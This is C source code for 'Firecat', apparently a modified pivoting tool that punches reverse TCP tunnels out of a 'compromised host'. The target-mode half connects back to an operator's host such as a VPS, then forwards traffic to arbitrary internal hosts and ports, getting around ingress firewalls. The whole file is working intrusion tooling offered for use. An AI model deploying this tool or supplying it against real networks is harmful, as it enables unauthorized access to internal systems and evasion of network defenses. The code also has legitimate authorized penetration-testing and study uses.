/*
 * Firecat v1.6
 * Copyright (C) 2008-2011 Stach & Liu LLC
 * 
 * Firecat allows you to punch reverse TCP tunnels out of a compromised host,
 * enabling you to connect to arbitrary host/ports on the target network regardless of
 * ingress firewall rules. 
 *
 * It incorporates code from netcat for Windows, specifically the "-e" command execution code.
 *
 */
#define VERSION "1.7"
#define WIN32_LEAN_AND_MEAN

#include <sys/types.h>
#ifdef WIN32
	#include "getopt.h"
	#pragma comment(lib,"getopt.lib")
	
	#include <windows.h>
	#define _INC_WINDOWS
	#include <winbase.h>
	#include <winsock2.h>
	#pragma comment (lib, "ws2_32") 
	
#include "stdafx.h"
	#define SHUT_RDWR SD_BOTH
#else
	#include <sys/socket.h>
	#include <netdb.h>
	#include <netinet/in.h>
	#include <arpa/inet.h>
	#ifdef _POSIX_VERSION
		#if _POSIX_VERSION >= 200112L
			#include <sys/select.h>
		#endif
	#endif
#endif
#include <stdlib.h>
#include <stdio.h>
#include "unistd.h"
//#include <sys/time.h>
#include <time.h>
#include <string.h>
#include <signal.h>
#include <errno.h>


#ifndef max
	int max(const int x, const int y) {
		return (x > y) ? x : y;
	}
#endif
       
#define BUF_SIZE 1024
#define DOEXEC_BUFFER_SIZE 200 // twiddle for windows doexec stuff. ctrl-f for "nc111nt.zip"

enum MODES { CONSULTANT_MODE, TARGET_MODE };
extern char *optarg;
extern int optind, opterr, optopt;

const char *usageString = ""
"FireCat2 v"VERSION" - Copyright 2008-2016 Stach & Liu & ruo\n\n" \
"Usage: firecat -m <mode> [options]\n\n" \
"  -m <mode>       0 = consultant, 1 = target\n\n" \
"In consultant mode:\n\n" \
"  -t <port>       Wait for incoming connections from target on this port\n" \
"  -s <port>       Wait for incoming connections from you on this port\n" \
"                  Connections to this port will be forwarded over tunnel\n\n" \
"In target mode:\n\n" \
"  -h <host>       Connect back to <host> (your IP)\n" \
"  -t <port>       Connect back to TCP <port> on <host>\n" \
"  -l <target>     (optional) Connect to <target> inside the target network\n" \
"                  Default: localhost\n"
"  -s <port>       Create a tunnel to <target>:<port> inside the target network\n\n" \
"example:\n\n" \
"  firecat -m 0 -t 8080 -s 22 (telnet 127.0.0.1 22)\n" \
"  firecat -m 1 -h yourvps -t 8080 -l 192.168.6.8 -s 22\n";


void usage(void) {
	puts(usageString);
}

//申明函数
int do_consultant(const int tunnelPort, const int servicePort);
int do_target(const char *consultantHost, const char *targetHost, const int tunnelPort, const int servicePort);
int listen_socket(const int listen_port);
int connect_socket(const int connect_port, const char *address);
int shovel_data(const int fd1, const int fd2);
void close_sock(const int fd);


/*************************
 * main
 */
int main(int argc, char **argv) {
	int opt, retVal;
	char consultantHost[BUF_SIZE];
	char targetHost[BUF_SIZE];
	int tunnelPort = 0, servicePort = 0, mode = 0xff;
	// Windows requires extra fiddling
	WORD wVersionRequested;
	WSADATA wsaData;

	wVersionRequested = MAKEWORD( 1, 1 );
	WSAStartup( wVersionRequested, &wsaData );

	memset(consultantHost, 0, BUF_SIZE);
	memset(targetHost, 0, BUF_SIZE);
	strncpy(targetHost, "localhost", BUF_SIZE);

	// parse commandline
	while((opt = getopt(argc, argv, "m:t:s:h:l:")) != -1) {
		switch(opt) {
			case 'm':
				//strtol() 函数用来将字符串转换为长整型数(long)
				mode = (int)strtol(optarg, NULL, 10);
				if(mode != 0 && mode != 1) {
					usage();
					exit(1);
				}
				break;
			case 't':
				tunnelPort = (int)strtol(optarg, NULL, 10);
				break;
			case 's':
				servicePort = (int)strtol(optarg, NULL, 10);
				break;
			case 'l':
				//printf("optopt=%c, optarg=%s\n", optopt, optarg);
				strncpy(targetHost, optarg, BUF_SIZE);
				break;
			case 'h':
				strncpy(consultantHost, optarg, BUF_SIZE);
				break;
			default:
				usage();
				exit(1);
				break;
		}
	}

	// In consultant 
	if(mode == CONSULTANT_MODE) {
		if(!tunnelPort || !servicePort) {
			usage();
			exit(1);
		}
		retVal = do_consultant(tunnelPort, servicePort);
	} else if(mode == TARGET_MODE) {
		if(!(tunnelPort && servicePort) || !consultantHost[0]) {
			usage();
			exit(1);
		}
		retVal = do_target(consultantHost, targetHost, tunnelPort, servicePort);
		                     //vps         inside host   80           22  
	} else {
		usage();
		exit(1);
	}
	
	exit(retVal);
}

/****************************
 * do_consultant()
 *
 * Waits for a connection from the target on port 'tunnelPort'.
 * Once received, waits for connection from local client on port 'servicePort'.
 * Once received, shovels bytes between the two endpoints.
 */ 
int do_consultant(const int tunnelPort, const int servicePort) {
	int tunnelSock, serviceSock, targetSock, clientSock;
	//unsigned int i;
	int i;
	struct sockaddr_in targetAddr, clientAddr;
	char buf[BUF_SIZE + 1];
	
	// wait for connection from the remote target host
	if((tunnelSock = listen_socket(tunnelPort)) == -1)
		return 1;
	i = sizeof(targetAddr);

	printf("Consultant: Waiting for a connection on port %d\n",tunnelPort);
	
	if((targetSock = accept(tunnelSock, (struct sockaddr *)&targetAddr, &i)) == -1) {
		perror("ERROR: accept()");
		return 1;
	}
	printf("Consultant: Got connection from remote target %s\n", inet_ntoa(targetAddr.sin_addr));
	
	// wait for an 'OK' from the target
	printf("Consultant: Waiting for ACK...\n");
	
	//If no error occurs, recv returns the number of bytes received and the buffer pointed to by the buf parameter will contain this data received. 
	if(recv(targetSock, buf, 2, 0) <= 0) {
		perror("ERROR: recv()");
		return 1;
	}
		
	if(buf[0] != 'O' || buf[1] != 'K') {
		printf("ERROR: Failed to acknowledge tunnel\n");
		return 1;
	}
	printf("Consultant: Received ACK, tunnel is established\n");
		
	// ok, tunnel is up and running
	// wait for connection from the local client program before sending an OK down the tunnel
	if((serviceSock = listen_socket(servicePort)) == -1)
		return 1;
	i = sizeof(clientAddr);

	printf("Consultant: Tunnel is now up on localhost:%d\n", servicePort);

	if((clientSock = accept(serviceSock,(struct sockaddr *) &clientAddr, &i)) == -1) {
		perror("ERROR: accept()");
		return 1;
	}
	printf("Consultant: Got connection from local client %s\n", inet_ntoa(clientAddr.sin_addr));

	// send an 'OK'
	if(send(targetSock, "OK", 2, 0) == -1) {
		perror("ERROR: send()");
		return 1;
	}
	printf("Consultant: Wo0t! You are connected. Shovelling data... press CTRL-C to abort\n");
	
	// shovel data between the client and the target
	return shovel_data(targetSock, clientSock);
}

/***********************
 * do_target()
 *
 * Connects to the consultant's machine on port 'tunnelPort'
 * Once established, waits for an 'OK' that signifies the client has connected.
 * Once received, connects locally to the port specified by 'servicePort'
 * and shovels bits across the tunnel between the client program and the local service port.
 */
int do_target(const char *consultantHost, const char *targetHost, const int tunnelPort, const int servicePort) {
	int tunnelSock, serviceSock;
	char buf[BUF_SIZE], *p;
	
	// connect to the consultant's host
	printf("Target: Init the tunnel with %s:%d,please waiting...\n", consultantHost, tunnelPort);
	if((tunnelSock = connect_socket(tunnelPort, consultantHost)) == -1)
		return 1;

	// send an ACK
	if(send(tunnelSock, "OK", 2, 0) == SOCKET_ERROR) {
		printf("ERROR: send() %d\n", WSAGetLastError());
		return 1;
	}
	
	// wait for an ACK from the consultant before connecting to the local service
	if(recv(tunnelSock, buf, 2, 0) <= 0) {
		printf("ERROR: recv() %d\n", WSAGetLastError());
		return 1;
	}

	if(buf[0] != 'O' || buf[1] != 'K') {
		printf("ERROR: Failed to acknowledge tunnel\n");
		return 1;
	}

	// if we're not spawning a shell we must be building a tunnel. Let's do it!
	// connect to local service
	printf("Target: Connecting to local service port %d\n", servicePort);		
	if((serviceSock = connect_socket(servicePort, targetHost)) == -1)
		return 1;
	printf("Target: Connected to service port %s:%d\n", targetHost, servicePort);
	printf("Target: Handshake is complete,tunnel is up.\n");
	
	// shovel data between the client and the target
	return shovel_data(tunnelSock, serviceSock);	
}


/************************
 * shovel_data()
 *
 * Data forwarding code that performs bidirectional tunneling between two end point sockets.
 */
int shovel_data(const int fd1, const int fd2) {
	fd_set rd, wr, er;	
	char c, buf1[BUF_SIZE], buf2[BUF_SIZE];
	int r, nfds;
	int buf1_avail = 0, buf1_written = 0;
	int buf2_avail = 0, buf2_written = 0;
	
	// Loop forever. This requires a CTRL-C or disconnected socket to abort.
	while(1) {
		// ensure things are sane each time around
		nfds = 0;
		FD_ZERO(&rd);
		FD_ZERO(&wr);
		FD_ZERO(&er);
		
		// setup the arrays for monitoring OOB, read, and write events on the 2 sockets
		if(buf1_avail < BUF_SIZE) {
		   FD_SET(fd1, &rd);
		   nfds = max(nfds, fd1);
		}
		if(buf2_avail < BUF_SIZE) {
		   FD_SET(fd2, &rd);
		   nfds = max(nfds, fd2);
		}
		if((buf2_avail - buf2_written) > 0) {
		   FD_SET(fd1, &wr);
		   nfds = max(nfds, fd1);
		}
		if((buf1_avail - buf1_written) > 0) {
		   FD_SET(fd2, &wr);
		   nfds = max(nfds, fd2);
		}
		FD_SET(fd1, &er);
		nfds = max(nfds, fd1);
		FD_SET(fd2, &er);
		nfds = max(nfds, fd2);
		
		// wait for something interesting to happen on a socket, or abort in case of error
		if(select(nfds + 1, &rd, &wr, &er, NULL) == -1)
			return 1;
	
		// OOB data ready
		if(FD_ISSET(fd1, &er)) {
			if(recv(fd1, &c, 1, MSG_OOB) < 1) {
				return 1;
			} else {
				if(send(fd2, &c, 1, MSG_OOB) < 1) {
					perror("ERROR: send()");
					return 1;
				}
			}
		}
		if(FD_ISSET(fd2, &er)) {
			if(recv(fd2, &c, 1, MSG_OOB) < 1) {
				return 1;
			} else {
				if(send(fd1, &c, 1, MSG_OOB) < 1) {
					perror("ERROR: send()");
					return 1;
				}
			}
		}
		
		// Data ready to read from socket(s)
		if(FD_ISSET(fd1, &rd)) {
			if((r = recv(fd1, buf1 + buf1_avail, BUF_SIZE - buf1_avail, 0)) < 1)
				return 1;
			else
				buf1_avail += r;
		}
		if(FD_ISSET(fd2, &rd)) {
			if((r = recv(fd2, buf2 + buf2_avail, BUF_SIZE - buf2_avail, 0))  < 1)
				return 1;
			else
				buf2_avail += r;
		}
		
		// Data ready to write to socket(s)
		if(FD_ISSET(fd1, &wr)) {
			if((r = send(fd1, buf2 + buf2_written,	buf2_avail - buf2_written, 0)) < 1)
				return 1;
			else
				buf2_written += r;
		}
		if(FD_ISSET(fd2, &wr)) {
			if((r = send(fd2, buf1 + buf1_written, buf1_avail - buf1_written, 0)) < 1)
				return 1;
			else
				buf1_written += r;
		}
		// Check to ensure written data has caught up with the read data
		if(buf1_written == buf1_avail)
			buf1_written = buf1_avail = 0;
		if(buf2_written == buf2_avail)
			buf2_written = buf2_avail = 0;
	}
}

/************************
 * listen_socket()
 *
 * Sets up a socket, bind()s it to all interfaces, then listen()s on it.
 * Returns a valid socket, or -1 on failure
 */
int listen_socket(const int listen_port)
{
	struct sockaddr_in a;
	int s;
	int yes = 1;

	// get a fresh juicy socket
	if((s = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
		printf("ERROR: socket() %d\n", WSAGetLastError() );
		WSACleanup();
		return -1;
	}
	
	// make sure it's quickly reusable
	if(setsockopt(s, SOL_SOCKET, SO_REUSEADDR,	(char *) &yes, sizeof(yes)) < 0) {
		perror("ERROR: setsockopt()");
		close(s);
		return -1;
	}
	
	// listen on all of the hosts interfaces/addresses (0.0.0.0)
	memset(&a, 0, sizeof(a));
	a.sin_port = htons(listen_port);
	a.sin_addr.s_addr = htonl(INADDR_ANY);
	a.sin_family = AF_INET;

	if(bind(s, (struct sockaddr *) &a, sizeof(a)) < 0) {
		perror("ERROR: bind()");
		close(s);
		return -1;
	}
	listen(s, 10);
	return s;
}

/*****************
 * connect_socket()
 *
 * Connects to a remote host:port and returns a valid socket if successful.
 * Returns -1 on failure.
 */
int connect_socket(const int connect_port, const char *address) {
	struct sockaddr_in a;
	struct hostent *ha;
	int s;
	
	// get a fresh juicy socket
	if((s = socket(PF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR) {
		printf("ERROR: socket() %d\n", WSAGetLastError() );
		WSACleanup();
		return -1;
	}

	// clear the sockaddr_in structure
	memset(&a, 0, sizeof(a));
	//a.sin_addr.s_addr = inet_addr(address);
	a.sin_port = htons(connect_port);
	a.sin_family = AF_INET;
	
	
	// get IP from host name, if appropriate
	if((ha = gethostbyname(address)) == NULL) {
		perror("ERROR: gethostbyname()");
		return -1;
	}
	if(ha->h_length == 0) {
		printf("ERROR: No addresses for %s. Aborting.\n", address);
		return -1;
	}

	memcpy(&a.sin_addr, ha->h_addr_list[0], ha->h_length);

	// connect to the remote host
	if(connect(s, (struct sockaddr *) &a, sizeof(a)) == SOCKET_ERROR) {
		printf("ERROR: connect() %d\n", WSAGetLastError());
		shutdown(s, SHUT_RDWR);
		//close(s);
		closesocket(s);
		WSACleanup();
		return -1;
	}
	
	// w00t, it worked.
	return s;
}


